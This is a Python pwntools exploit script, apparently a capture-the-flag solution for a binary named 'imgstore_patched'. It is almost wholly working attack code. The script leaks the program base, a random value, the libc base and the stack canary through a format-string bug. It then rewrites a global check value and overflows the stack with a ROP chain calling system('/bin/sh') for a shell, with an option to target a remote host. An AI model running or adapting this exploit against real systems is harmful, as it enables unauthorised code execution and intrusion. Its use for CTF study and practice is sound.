#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('imgstore_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1E6F
breakrva 0x1ECD 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# ** Goal function sell book: sell_book **
# - leak the rand buf generated from /dev/urandom + canary + libc
# - overwrite the global variable to match (rand_buf * 334873123)
# - overflow to one_gadget


def init():
    global io

    io = start()


def solve():

    leak = "%6$p.%7$p.%13$p.%17$p"
    io.recvuntil(">>")
    io.sendline("3")
    io.sendline(leak)

    io.recvuntil("title --> ")
    leaked = io.recvline().split(b'.')
    exe.address = int(leaked[0], 16) - 0x6060
    rand_buf = int(leaked[1], 16) & 0xffff
    libc.address = int(leaked[2], 16) - 0x8459a
    canary = int(leaked[3], 16)
    
    info("rand_buf: %#x", rand_buf)
    info("canary: %#x", canary)
    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)

    offset = 8
    write_val = (0x13F5C223 * rand_buf) & 0xffffffff
    check = exe.address + 0x6050
    
    info("write -> %#x what -> %#x", check, write_val)

    write = {
        check: write_val
    }

    payload = fmtstr_payload(offset, write, write_size='short')

    io.sendline('y')
    io.sendline(payload)

    offset = 104
    pop_rdi = exe.address + 0x02313 # pop rdi; ret;
    sh = next(libc.search(b'/bin/sh')) # /bin/sh
    ret = exe.address + 0x101a # ret;
    system = libc.sym['system']

    payload = flat({
        offset: [
            canary,
            b'A'*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
